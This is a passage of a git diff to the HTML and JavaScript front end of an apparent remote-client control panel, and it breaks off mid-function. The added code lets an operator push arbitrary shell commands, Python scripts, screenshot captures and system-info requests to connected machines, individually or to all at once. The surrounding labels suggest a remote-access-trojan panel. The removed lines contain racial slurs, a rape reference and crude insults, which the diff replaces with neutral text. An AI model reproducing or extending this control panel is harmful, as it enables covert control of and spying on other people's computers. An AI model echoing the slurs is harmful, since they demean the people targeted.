@@ -1616,6 +1616,64 @@
         body.theme-femboy .date-separator span {
             background: rgba(255, 107, 157, 0.2);
         }
+
+        /* ========== CLIENT CHAT MODAL STYLES ========== */
+        #clientChatModal .modal-content {
+            max-width: 500px;
+        }
+
+        #clientChatOutput {
+            background: rgba(0, 0, 0, 0.7);
+            color: var(--success);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            min-height: 100px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        body.theme-femboy #clientChatOutput {
+            background: rgba(255, 255, 255, 0.9);
+            color: var(--success);
+            border: 1px solid rgba(46, 213, 115, 0.3);
+        }
+
+        /* Client message styling */
+        .message-client {
+            align-self: flex-start;
+            background: rgba(0, 128, 0, 0.2);
+            color: #90ee90;
+            border-bottom-left-radius: 4px;
+            border-left: 3px solid #32cd32;
+        }
+
+        body.theme-femboy .message-client {
+            background: rgba(46, 213, 115, 0.2);
+            color: #155724;
+            border-left: 3px solid #28a745;
+        }
+
+        .message-client .message-sender {
+            color: #32cd32;
+        }
+
+        body.theme-femboy .message-client .message-sender {
+            color: #28a745;
+        }
+
+        /* Client chat button in table */
+        .btn-client-chat {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+        }
+
+        .btn-client-chat:hover {
+            background: rgba(0, 255, 0, 0.2);
+            border-color: #32cd32;
+        }
     </style>
 </head>
 <body>
@@ -1647,13 +1705,13 @@
             
             <div id="loginError" class="hidden mt-2">
                 <div class="text-center text-danger">
-                    <i class="fas fa-exclamation-triangle"></i> <span id="loginErrorText">Authentication failed nigga</span>
+                    <i class="fas fa-exclamation-triangle"></i> <span id="loginErrorText">Authentication failed</span>
                 </div>
             </div>
             
             <div class="text-center mt-4">
-                <div class="form-hint">fuck you nathan</div>
-                <div class="form-hint mt-2">Press Enter to fuck</div>
+                <div class="form-hint">Advanced Client Monitoring System</div>
+                <div class="form-hint mt-2">Press Enter to login</div>
             </div>
         </div>
     </div>
@@ -1688,7 +1746,7 @@
                     </div>
                     
                     <button onclick="handleLogout()" class="logout-btn btn btn-primary">
-                        <i class="fas fa-sign-out-alt"></i> GOONOUT
+                        <i class="fas fa-sign-out-alt"></i> LOGOUT
                     </button>
                 </div>
             </header>
@@ -1700,7 +1758,7 @@
                         <i class="fas fa-desktop"></i>
                     </div>
                     <div class="stat-value" id="totalClients">0</div>
-                    <div class="stat-label">TOTAL USERS ON WEB</div>
+                    <div class="stat-label">TOTAL CLIENTS</div>
                     <div class="stat-trend positive" id="clientsTrend">
                         <i class="fas fa-arrow-up"></i> <span id="onlineClients">0</span> online
                     </div>
@@ -1767,14 +1825,17 @@
                                 <button onclick="refreshClients()" class="btn btn-secondary btn-sm">
                                     <i class="fas fa-sync"></i> REFRESH
                                 </button>
+                                <button onclick="openClientChat()" class="btn btn-primary btn-sm">
+                                    <i class="fas fa-comment-medical"></i> TALK TO CLIENT
+                                </button>
                             </div>
                         </div>
                         
                         <div class="panel-content">
                             <div id="clientsEmpty" class="empty-state">
                                 <i class="fas fa-users-slash"></i>
-                                <h3>No Niggers Connected</h3>
-                                <p>Waiting for Slut connections...</p>
+                                <h3>No Clients Connected</h3>
+                                <p>Waiting for client connections...</p>
                             </div>
                             
                             <div class="table-container" id="clientsTableContainer">
@@ -2280,6 +2341,9 @@ if __name__ == "__main__":
                                 <button onclick="quickAction('refresh_all')" class="btn btn-secondary w-full justify-start">
                                     <i class="fas fa-sync"></i> Refresh All Data
                                 </button>
+                                <button onclick="quickAction('talk_to_all_clients')" class="btn btn-primary w-full justify-start">
+                                    <i class="fas fa-bullhorn"></i> Message All Clients
+                                </button>
                                 <button onclick="showPythonTemplate('monitor')" class="btn btn-secondary w-full justify-start">
                                     <i class="fab fa-python"></i> System Monitor Script
                                 </button>
@@ -2322,7 +2386,7 @@ if __name__ == "__main__":
     <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loading-spinner"></div>
-        <div class="mt-4 text-accent" id="loadingMessage">Rapeing...</div>
+        <div class="mt-4 text-accent" id="loadingMessage">Loading...</div>
     </div>
 
     <!-- Python Templates Modal -->
@@ -2353,6 +2417,58 @@ if __name__ == "__main__":
                     <div class="p-3 border rounded cursor-pointer hover:bg-gray-800" onclick="loadPythonTemplate('screenshot')">
                         <h4 class="font-bold text-accent"><i class="fas fa-camera"></i> Screenshot Capture</h4>
                         <p class="text-sm">Capture periodic screenshots</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Client Chat Modal -->
+    <div id="clientChatModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-comment-medical"></i> TALK TO CLIENT</h3>
+                <button class="modal-close" onclick="closeClientChat()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label">SELECT CLIENT</label>
+                    <select id="chatClientSelect" class="form-control">
+                        <option value="">-- Select a client --</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">MESSAGE</label>
+                    <textarea id="clientChatMessage" class="form-control" rows="4" 
+                             placeholder="Type your message to the client..."></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">COMMAND TYPE</label>
+                    <select id="clientChatCommandType" class="form-control" onchange="updateClientChatCommand()">
+                        <option value="message">📝 Simple Message</option>
+                        <option value="system_info">💻 Get System Info</option>
+                        <option value="screenshot">📷 Capture Screenshot</option>
+                        <option value="custom">⚡ Custom Command</option>
+                        <option value="python">🐍 Python Script</option>
+                    </select>
+                </div>
+                
+                <div id="clientChatCommandParams" class="form-group hidden">
+                    <label class="form-label">COMMAND PARAMETERS</label>
+                    <textarea id="clientChatCommand" class="form-control" rows="3" 
+                             placeholder="Enter command or code..."></textarea>
+                </div>
+                
+                <button onclick="sendToClient()" class="btn btn-primary w-full">
+                    <i class="fas fa-paper-plane"></i> SEND TO CLIENT
+                </button>
+                
+                <div id="clientChatResponse" class="mt-3 hidden">
+                    <div class="form-group">
+                        <label class="form-label">RESPONSE</label>
+                        <pre id="clientChatOutput" class="form-control"></pre>
                     </div>
                 </div>
             </div>
@@ -2446,6 +2562,14 @@ if __name__ == "__main__":
                 if (e.key === 'Enter') handleLogin();
             });
             
+            // Client chat modal inputs
+            document.getElementById('clientChatMessage').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && e.ctrlKey) {
+                    e.preventDefault();
+                    sendToClient();
+                }
+            });
+            
             // Close modals on ESC
             document.addEventListener('keydown', (e) => {
                 if (e.key === 'Escape') {
@@ -2464,7 +2588,7 @@ if __name__ == "__main__":
                 return;
             }
             
-            showLoading('hold nigga its Authenticating...');
+            showLoading('Authenticating...');
             
             try {
                 const response = await fetch(`${CONFIG.BACKEND_URL}/api/login`, {
@@ -2585,7 +2709,7 @@ if __name__ == "__main__":
         // ========== DASHBOARD ==========
         async function initializeDashboard() {
             try {
-                showLoading('Loading Femboy Clips...');
+                showLoading('Loading dashboard...');
                 
                 // Show dashboard
                 document.getElementById('loginPage').classList.add('hidden');
@@ -2831,6 +2955,14 @@ if __name__ == "__main__":
                         `Error: ${data.error || 'None'}`;
                     refreshLogs();
                     break;
+                    
+                case 'client_chat_response':
+                    handleClientChatResponse(data);
+                    break;
+                    
+                case 'client_chat_ack':
+                    showNotification(`Client ${data.client_id} received message`, 'success');
+                    break;
             }
         }
 
@@ -2923,6 +3055,219 @@ if __name__ == "__main__":
                 case 'pong':
                     // Keep connection alive
                     break;
+            }
+        }
+
+        // ========== CLIENT CHAT FUNCTIONS ==========
+        function openClientChat(clientId = null) {
+            const modal = document.getElementById('clientChatModal');
+            const select = document.getElementById('chatClientSelect');
+            
+            // Populate client dropdown
+            select.innerHTML = '<option value="">-- Select a client --</option>';
+            state.clients.forEach(client => {
+                const option = document.createElement('option');
+                option.value = client.client_id;
+                option.textContent = `${client.name} (${client.client_id.substring(0, 8)})`;
+                if (clientId && client.client_id === clientId) {
+                    option.selected = true;
+                }
+                select.appendChild(option);
+            });
+            
+            // Clear previous data
+            document.getElementById('clientChatMessage').value = '';
+            document.getElementById('clientChatCommand').value = '';
+            document.getElementById('clientChatCommandParams').classList.add('hidden');
+            document.getElementById('clientChatResponse').classList.add('hidden');
+            
+            modal.style.display = 'flex';
+            
+            // Focus on message input
+            setTimeout(() => {
+                document.getElementById('clientChatMessage').focus();
+            }, 100);
+        }
+
+        function closeClientChat() {
+            document.getElementById('clientChatModal').style.display = 'none';
+        }
+
+        function updateClientChatCommand() {
+            const type = document.getElementById('clientChatCommandType').value;
+            const paramsDiv = document.getElementById('clientChatCommandParams');
+            const textarea = document.getElementById('clientChatCommand');
+            
+            if (type === 'message') {
+                paramsDiv.classList.add('hidden');
+                textarea.placeholder = 'Enter message...';
+            } else if (type === 'custom') {
+                paramsDiv.classList.remove('hidden');
+                textarea.placeholder = 'Enter custom command (e.g., "dir" or "ls -la")...';
+            } else if (type === 'python') {
+                paramsDiv.classList.remove('hidden');
+                textarea.placeholder = 'Enter Python code...';
+            } else {
+                paramsDiv.classList.add('hidden');
+                textarea.placeholder = 'Parameters will be added automatically...';
+            }
+        }
+
+        async function sendToClient() {
+            const clientId = document.getElementById('chatClientSelect').value;
+            const message = document.getElementById('clientChatMessage').value.trim();
+            const commandType = document.getElementById('clientChatCommandType').value;
+            const command = document.getElementById('clientChatCommand').value.trim();
+            
+            if (!clientId) {
+                showNotification('Please select a client', 'warning');
+                return;
+            }
+            
+            if (!message && commandType === 'message') {
+                showNotification('Please enter a message', 'warning');
+                return;
+            }
+            
+            showLoading('Sending to client...');
+            
+            try {
+                let response;
+                
+                if (commandType === 'message') {
+                    // Send chat message via WebSocket to client
+                    if (state.ws && state.ws.readyState === WebSocket.OPEN) {
+                        state.ws.send(JSON.stringify({
+                            type: 'client_chat',
+                            client_id: clientId,
+                            message: message,
+                            from_user: state.user.email,
+                            timestamp: new Date().toISOString()
+                        }));
+                        
+                        showNotification(`Message sent to client: ${clientId}`, 'success');
+                        
+                        // Add message to chat history
+                        addClientMessageToChat(clientId, message, true);
+                    } else {
+                        throw new Error('WebSocket not connected');
+                    }
+                } else {
+                    // Send command
+                    const parameters = {};
+                    
+                    switch (commandType) {
+                        case 'custom':
+                            if (!command) {
+                                throw new Error('Please enter command');
+                            }
+                            parameters.code = command;
+                            break;
+                        case 'python':
+                            if (!command) {
+                                throw new Error('Please enter Python code');
+                            }
+                            parameters.code = command;
+                            parameters.is_python = true;
+                            break;
+                        case 'system_info':
+                        case 'screenshot':
+                            // No additional parameters needed
+                            break;
+                    }
+                    
+                    response = await fetch(`${CONFIG.BACKEND_URL}/api/command`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': `Bearer ${state.token}`
+                        },
+                        body: JSON.stringify({
+                            client_id: clientId,
+                            command: commandType === 'python' ? 'custom' : commandType,
+                            parameters: parameters
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        if (data.success) {
+                            showNotification(`Command sent to client: ${clientId}`, 'success');
+                            
+                            // Show response area
+                            document.getElementById('clientChatResponse').classList.remove('hidden');
+                            document.getElementById('clientChatOutput').textContent = 
+                                `Command sent successfully!\nCommand ID: ${data.command_id}\nClient: ${clientId}\nType: ${commandType}`;
+                            
+                            // Add command to chat history
+                            addCommandToChat(clientId, commandType, command);
+                        }
+                    }
+                }
+                
+                // Clear form if successful
+                if (!response || response.ok) {
+                    document.getElementById('clientChatMessage').value = '';
+                    document.getElementById('clientChatCommand').value = '';
+                }
+                
+            } catch (error) {
+                console.error('Send to client error:', error);
+                showNotification(`Failed to send to client: ${error.message}`, 'error');
+                
+                document.getElementById('clientChatResponse').classList.remove('hidden');
+                document.getElementById('clientChatOutput').textContent = `Error: ${error.message}`;
+            } finally {
+                hideLoading();
+            }
+        }
+
+        function addClientMessageToChat(clientId, message, isSent = true) {
+            const chatMessage = {
+                id: 'client_' + Date.now(),
+                sender: isSent ? state.user.email : clientId,
+                recipient: isSent ? clientId : state.user.email,
+                message: message,
+                timestamp: new Date().toISOString(),
+                sender_tag: isSent ? 
+                    (db.get_user_tag?.(state.user.email) || { role: 'admin', color: '#8a2be2' }) :
+                    { role: 'client', color: '#32cd32' }
+            };
+            
+            handleNewMessage(chatMessage, chatMessage.sender_tag);
+        }
+
+        function addCommandToChat(clientId, commandType, command) {
+            const message = `[Command to ${clientId}]: ${commandType}` + 
+                          (command ? `\n${command.substring(0, 100)}${command.length > 100 ? '...' : ''}` : '');
+            
+            addClientMessageToChat(clientId, message, true);
+        }
+
+        function handleClientChatResponse(data) {
+            console.log('Client chat response:', data);
+            
+            showNotification(`Client ${data.client_id} responded`, 'info');
+            
+            // Add to chat messages
+            const chatMessage = {
+                id: 'resp_' + Date.now(),
+                sender: data.client_id,
+                recipient: state.user.email,
+                message: `[Client Response]: ${data.message}`,
+                timestamp: data.timestamp || new Date().toISOString(),
+                sender_tag: { role: 'client', color: '#32cd32' }
+            };
+            
+            handleNewMessage(chatMessage, chatMessage.sender_tag);
+            
+            // Update client chat modal if open
+            if (document.getElementById('clientChatModal').style.display === 'flex') {
+                const output = document.getElementById('clientChatOutput');
+                if (output) {
+                    output.textContent += `\n\n=== CLIENT RESPONSE ===\n${data.message}`;
+                    output.scrollTop = output.scrollHeight;
+                }
             }
         }
 
@@ -3268,8 +3613,15 @@ if __name__ == "__main__":
 
         function createMessageElement(message) {
             const isSent = message.sender === state.user.email;
+            const isClient = message.sender_tag?.role === 'client';
             const messageElement = document.createElement('div');
-            messageElement.className = `message ${isSent ? 'message-sent' : 'message-received'}`;
+            
+            if (isClient) {
+                messageElement.className = `message message-client`;
+            } else {
+                messageElement.className = `message ${isSent ? 'message-sent' : 'message-received'}`;
+            }
+            
             messageElement.dataset.messageId = message.id;
             messageElement.dataset.timestamp = message.timestamp;
             
@@ -3454,6 +3806,11 @@ if __name__ == "__main__":
         function handleNewMessage(message, senderTag) {
             console.log('New message received from:', message.sender);
             
+            // Check if message is from a client (starts with "client-" or has client tag)
+            const isClientMessage = message.sender.startsWith('client-') || 
+                                   senderTag?.role === 'client' ||
+                                   message.sender_tag?.role === 'client';
+            
             // Increment unread count if message is not from current conversation
             if (message.sender !== state.user.email) {
                 const recipient = message.recipient || 'all';
@@ -3497,7 +3854,7 @@ if __name__ == "__main__":
             // Update user list if sender is new
             const userExists = chatState.users.some(u => u.user_id === message.sender) ||
                               chatState.conversations.some(u => u.user_id === message.sender);
-            if (!userExists && message.sender !== state.user.email) {
+            if (!userExists && message.sender !== state.user.email && !isClientMessage) {
                 loadChatUsers();
             }
         }
@@ -3633,221 +3990,29 @@ if __name__ == "__main__":
             }
         }
 
-        // ========== FILE ATTACHMENT ==========
-        function attachFile() {
-            document.getElementById('fileInput').click();
-        }
-
-        function attachImage() {
-            document.getElementById('imageInput').click();
-        }
-
-        function attachVideo() {
-            document.getElementById('videoInput').click();
-        }
-
-        async function handleFileSelect(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            await uploadAndSendFile(file, false);
-        }
-
-        async function handleImageSelect(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            // Compress image if needed
-            const compressedFile = await compressImage(file);
-            await uploadAndSendFile(compressedFile, false);
-        }
-
-        async function handleVideoSelect(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            // Check file size (limit to 50MB)
-            if (file.size > 50 * 1024 * 1024) {
-                showNotification('Video file too large (max 50MB)', 'warning');
-                return;
-            }
-            
-            await uploadAndSendFile(file, false);
-        }
-
-        async function handleAudioSelect(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            await uploadAndSendFile(file, true);
-        }
-
-        async function uploadAndSendFile(file, isVoiceNote = false) {
-            showLoading('Uploading file...');
-            
-            try {
-                // Upload file
-                const formData = new FormData();
-                formData.append('file', file);
-                
-                const uploadResponse = await fetch(`${CONFIG.BACKEND_URL}/api/chat/upload-file`, {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': `Bearer ${state.token}`
-                    },
-                    body: formData
-                });
-                
-                if (uploadResponse.ok) {
-                    const uploadData = await uploadResponse.json();
-                    
-                    if (uploadData.success) {
-                        // Send message with file
-                        const response = await fetch(`${CONFIG.BACKEND_URL}/api/chat/send`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'Authorization': `Bearer ${state.token}`
-                            },
-                            body: JSON.stringify({
-                                message: isVoiceNote ? 'Voice note' : `Sent ${file.name}`,
-                                recipient: chatState.currentRecipient === 'all' ? null : chatState.currentRecipient,
-                                file_name: file.name,
-                                file_type: file.type,
-                                is_voice_note: isVoiceNote,
-                                file_data: uploadData.data || null
-                            })
-                        });
-                        
-                        if (response.ok) {
-                            showNotification('File sent successfully', 'success');
-                        }
+        function updateUserOnlineStatus(userId, online) {
+            // Update user status in chat lists
+            const userElements = document.querySelectorAll(`.chat-user`);
+            userElements.forEach(element => {
+                const nameElement = element.querySelector('.user-name');
+                if (nameElement && nameElement.textContent === userId) {
+                    const statusElement = element.querySelector('.user-status');
+                    if (statusElement) {
+                        statusElement.className = `user-status ${online ? 'status-online' : 'status-offline'}`;
+                        statusElement.querySelector('span').textContent = online ? 'Online' : 'Offline';
                     }
                 }
-            } catch (error) {
-                console.error('File upload error:', error);
-                showNotification('Failed to upload file', 'error');
-            } finally {
-                hideLoading();
+            });
+        }
+
+        function updateMessageReadStatus(messageId, userId) {
+            const message = chatState.messages.find(msg => msg.id === messageId);
+            if (message && !message.read_by?.includes(userId)) {
+                message.read_by = message.read_by || [];
+                message.read_by.push(userId);
             }
         }
 
-        // ========== VOICE RECORDING ==========
-        async function recordVoiceNote() {
-            if (!chatState.isRecording) {
-                // Start recording
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    chatState.audioRecorder = new MediaRecorder(stream);
-                    chatState.audioChunks = [];
-                    
-                    chatState.audioRecorder.ondataavailable = (event) => {
-                        chatState.audioChunks.push(event.data);
-                    };
-                    
-                    chatState.audioRecorder.onstop = async () => {
-                        // Send voice note
-                        await sendChatMessage();
-                        
-                        // Stop all tracks
-                        stream.getTracks().forEach(track => track.stop());
-                    };
-                    
-                    chatState.audioRecorder.start();
-                    chatState.isRecording = true;
-                    
-                    // Update button
-                    const button = document.getElementById('voiceRecordBtn');
-                    button.innerHTML = '<i class="fas fa-stop"></i>';
-                    button.style.background = 'var(--danger)';
-                    
-                    // Auto-stop after 60 seconds
-                    chatState.recordingTimeout = setTimeout(() => {
-                        if (chatState.isRecording) {
-                            stopVoiceRecording();
-                        }
-                    }, 60000);
-                    
-                    showNotification('Recording started...', 'info');
-                    
-                } catch (error) {
-                    console.error('Recording error:', error);
-                    showNotification('Failed to access microphone', 'error');
-                }
-            } else {
-                // Stop recording
-                stopVoiceRecording();
-            }
-        }
-
-        function stopVoiceRecording() {
-            if (chatState.audioRecorder && chatState.isRecording) {
-                chatState.audioRecorder.stop();
-                chatState.isRecording = false;
-                
-                // Clear timeout
-                if (chatState.recordingTimeout) {
-                    clearTimeout(chatState.recordingTimeout);
-                }
-                
-                // Update button
-                const button = document.getElementById('voiceRecordBtn');
-                button.innerHTML = '<i class="fas fa-microphone"></i>';
-                button.style.background = '';
-                
-                showNotification('Recording stopped', 'info');
-            }
-        }
-
-        // ========== FILE DOWNLOAD ==========
-        async function downloadFile(fileId, fileName) {
-            try {
-                const response = await fetch(`${CONFIG.BACKEND_URL}/api/chat/download/${fileId}`, {
-                    headers: {
-                        'Authorization': `Bearer ${state.token}`
-                    }
-                });
-                
-                if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = fileName;
-                    document.body.appendChild(a);
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-                    document.body.removeChild(a);
-                } else {
-                    throw new Error('Download failed');
-                }
-            } catch (error) {
-                console.error('Download error:', error);
-                showNotification('Failed to download file', 'error');
-            }
-        }
-
-        async function playVoiceNote(fileId) {
-            try {
-                const response = await fetch(`${CONFIG.BACKEND_URL}/api/chat/download/${fileId}`, {
-                    headers: {
-                        'Authorization': `Bearer ${state.token}`
-                    }
-                });
-                
-                if (response.ok) {
-                    const blob = await response.blob();
-                    const audioUrl = URL.createObjectURL(blob);
-                    const audioPlayer = document.getElementById('audioPlayer');
-                    audioPlayer.src = audioUrl;
-                    audioPlayer.play();
-                }
-            } catch (error) {
-                console.error('Play voice note error:', error);
-            }
-        }
-
-        // ========== MESSAGE STATUS ==========
         async function markMessageAsRead(messageId) {
             try {
                 await fetch(`${CONFIG.BACKEND_URL}/api/chat/mark-read/${messageId}`, {
@@ -3866,14 +4031,6 @@ if __name__ == "__main__":
                 }
             } catch (error) {
                 console.error('Mark read error:', error);
-            }
-        }
-
-        function updateMessageReadStatus(messageId, userId) {
-            const message = chatState.messages.find(msg => msg.id === messageId);
-            if (message && !message.read_by?.includes(userId)) {
-                message.read_by = message.read_by || [];
-                message.read_by.push(userId);
             }
         }
 
@@ -3938,6 +4095,9 @@ if __name__ == "__main__":
                             <button onclick="clientAction('${client.client_id}', 'info')" class="btn btn-secondary btn-icon" title="System Info">
                                 <i class="fas fa-info-circle"></i>
                             </button>
+                            <button onclick="openClientChat('${client.client_id}')" class="btn btn-client-chat btn-icon" title="Talk to Client">
+                                <i class="fas fa-comment"></i>
+                            </button>
                             <button onclick="clientAction('${client.client_id}', 'python')" class="btn btn-secondary btn-icon" title="Run Python">
                                 <i class="fab fa-python"></i>
                             </button>
@@ -3974,6 +4134,44 @@ if __name__ == "__main__":
                         pythonSelect.appendChild(option);
                     }
                 });
+            }
+        }
+
+        function clientAction(clientId, action) {
+            switch (action) {
+                case 'screenshot':
+                    sendCommandToClient(clientId, 'screenshot');
+                    break;
+                case 'info':
+                    sendCommandToClient(clientId, 'system_info');
+                    break;
+                case 'python':
+                    document.getElementById('pythonClient').value = clientId;
+                    switchTab('python');
+                    break;
+            }
+        }
+
+        async function sendCommandToClient(clientId, command) {
+            try {
+                const response = await fetch(`${CONFIG.BACKEND_URL}/api/command`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${state.token}`
+                    },
+                    body: JSON.stringify({
+                        client_id: clientId,
+                        command: command,
+                        parameters: {}
+                    })
+                });
+                
+                if (response.ok) {
+                    showNotification(`Command sent to ${clientId}`, 'success');
+                }
+            } catch (error) {
+                console.error('Send command error:', error);
             }
         }
 
@@ -4977,42 +5175,10 @@ if __name__ == "__main__":
             }, CONFIG.REFRESH_INTERVAL);
         }
 
-        function clientAction(clientId, action) {
-            switch (action) {
-                case 'screenshot':
-                    sendCommandToClient(clientId, 'screenshot');
-                    break;
-                case 'info':
-                    sendCommandToClient(clientId, 'system_info');
-                    break;
-                case 'python':
-                    document.getElementById('pythonClient').value = clientId;
-                    switchTab('python');
-                    break;
-            }
-        }
-
-        async function sendCommandToClient(clientId, command) {
-            try {
-                const response = await fetch(`${CONFIG.BACKEND_URL}/api/command`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${state.token}`
-                    },
-                    body: JSON.stringify({
-                        client_id: clientId,
-                        command: command,
-                        parameters: {}
-                    })
-                });
-                
-                if (response.ok) {
-                    showNotification(`Command sent to ${clientId}`, 'success');
-                }
-            } catch (error) {
-                console.error('Send command error:', error);
-            }
+        function clearCommandForm() {
+            document.getElementById('commandCode').value = '';
+            document.getElementById('commandParams').classList.add('hidden');
+            showNotification('Command form cleared', 'info');
         }
 
         function quickAction(action) {
@@ -5042,13 +5208,13 @@ if __name__ == "__main__":
                     updateStats();
                     showNotification('All data refreshed', 'success');
                     break;
+                    
+                case 'talk_to_all_clients':
+                    // Open client chat modal for broadcast
+                    openClientChat();
+                    showNotification('Open client chat to send message to all', 'info');
+                    break;
             }
-        }
-
-        function clearCommandForm() {
-            document.getElementById('commandCode').value = '';
-            document.getElementById('commandParams').classList.add('hidden');
-            showNotification('Command form cleared', 'info');
         }
 
         function showAbout() {
@@ -5064,6 +5230,22 @@ if __name__ == "__main__":
         }
 
         // ========== CHAT UTILITY FUNCTIONS ==========
+        function searchUsers() {
+            const searchTerm = document.getElementById('chatSearch').value.toLowerCase();
+            const users = document.querySelectorAll('.chat-user');
+            
+            users.forEach(user => {
+                const name = user.querySelector('.user-name').textContent.toLowerCase();
+                const status = user.querySelector('.user-status span').textContent.toLowerCase();
+                
+                if (name.includes(searchTerm) || status.includes(searchTerm) || searchTerm === '') {
+                    user.style.display = 'flex';
+                } else {
+                    user.style.display = 'none';
+                }
+            });
+        }
+
         function stringToColor(str) {
             let hash = 0;
             for (let i = 0; i < str.length; i++) {
@@ -5174,6 +5356,220 @@ if __name__ == "__main__":
             });
         }
 
+        // ========== FILE ATTACHMENT FUNCTIONS ==========
+        function attachFile() {
+            document.getElementById('fileInput').click();
+        }
+
+        function attachImage() {
+            document.getElementById('imageInput').click();
+        }
+
+        function attachVideo() {
+            document.getElementById('videoInput').click();
+        }
+
+        async function handleFileSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            await uploadAndSendFile(file, false);
+        }
+
+        async function handleImageSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            // Compress image if needed
+            const compressedFile = await compressImage(file);
+            await uploadAndSendFile(compressedFile, false);
+        }
+
+        async function handleVideoSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            // Check file size (limit to 50MB)
+            if (file.size > 50 * 1024 * 1024) {
+                showNotification('Video file too large (max 50MB)', 'warning');
+                return;
+            }
+            
+            await uploadAndSendFile(file, false);
+        }
+
+        async function handleAudioSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            await uploadAndSendFile(file, true);
+        }
+
+        async function uploadAndSendFile(file, isVoiceNote = false) {
+            showLoading('Uploading file...');
+            
+            try {
+                // Upload file
+                const formData = new FormData();
+                formData.append('file', file);
+                
+                const uploadResponse = await fetch(`${CONFIG.BACKEND_URL}/api/chat/upload-file`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${state.token}`
+                    },
+                    body: formData
+                });
+                
+                if (uploadResponse.ok) {
+                    const uploadData = await uploadResponse.json();
+                    
+                    if (uploadData.success) {
+                        // Send message with file
+                        const response = await fetch(`${CONFIG.BACKEND_URL}/api/chat/send`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Authorization': `Bearer ${state.token}`
+                            },
+                            body: JSON.stringify({
+                                message: isVoiceNote ? 'Voice note' : `Sent ${file.name}`,
+                                recipient: chatState.currentRecipient === 'all' ? null : chatState.currentRecipient,
+                                file_name: file.name,
+                                file_type: file.type,
+                                is_voice_note: isVoiceNote,
+                                file_data: uploadData.data || null
+                            })
+                        });
+                        
+                        if (response.ok) {
+                            showNotification('File sent successfully', 'success');
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('File upload error:', error);
+                showNotification('Failed to upload file', 'error');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        // ========== VOICE RECORDING ==========
+        async function recordVoiceNote() {
+            if (!chatState.isRecording) {
+                // Start recording
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    chatState.audioRecorder = new MediaRecorder(stream);
+                    chatState.audioChunks = [];
+                    
+                    chatState.audioRecorder.ondataavailable = (event) => {
+                        chatState.audioChunks.push(event.data);
+                    };
+                    
+                    chatState.audioRecorder.onstop = async () => {
+                        // Send voice note
+                        await sendChatMessage();
+                        
+                        // Stop all tracks
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    
+                    chatState.audioRecorder.start();
+                    chatState.isRecording = true;
+                    
+                    // Update button
+                    const button = document.getElementById('voiceRecordBtn');
+                    button.innerHTML = '<i class="fas fa-stop"></i>';
+                    button.style.background = 'var(--danger)';
+                    
+                    // Auto-stop after 60 seconds
+                    chatState.recordingTimeout = setTimeout(() => {
+                        if (chatState.isRecording) {
+                            stopVoiceRecording();
+                        }
+                    }, 60000);
+                    
+                    showNotification('Recording started...', 'info');
+                    
+                } catch (error) {
+                    console.error('Recording error:', error);
+                    showNotification('Failed to access microphone', 'error');
+                }
+            } else {
+                // Stop recording
+                stopVoiceRecording();
+            }
+        }
+
+        function stopVoiceRecording() {
+            if (chatState.audioRecorder && chatState.isRecording) {
+                chatState.audioRecorder.stop();
+                chatState.isRecording = false;
+                
+                // Clear timeout
+                if (chatState.recordingTimeout) {
+                    clearTimeout(chatState.recordingTimeout);
+                }
+                
+                // Update button
+                const button = document.getElementById('voiceRecordBtn');
+                button.innerHTML = '<i class="fas fa-microphone"></i>';
+                button.style.background = '';
+                
+                showNotification('Recording stopped', 'info');
+            }
+        }
+
+        // ========== FILE DOWNLOAD ==========
+        async function downloadFile(fileId, fileName) {
+            try {
+                const response = await fetch(`${CONFIG.BACKEND_URL}/api/chat/download/${fileId}`, {
+                    headers: {
+                        'Authorization': `Bearer ${state.token}`
+                    }
+                });
+                
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = fileName;
+                    document.body.appendChild(a);
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                } else {
+                    throw new Error('Download failed');
+                }
+            } catch (error) {
+                console.error('Download error:', error);
+                showNotification('Failed to download file', 'error');
+            }
+        }
+
+        async function playVoiceNote(fileId) {
+            try {
+                const response = await fetch(`${CONFIG.BACKEND_URL}/api/chat/download/${fileId}`, {
+                    headers: {
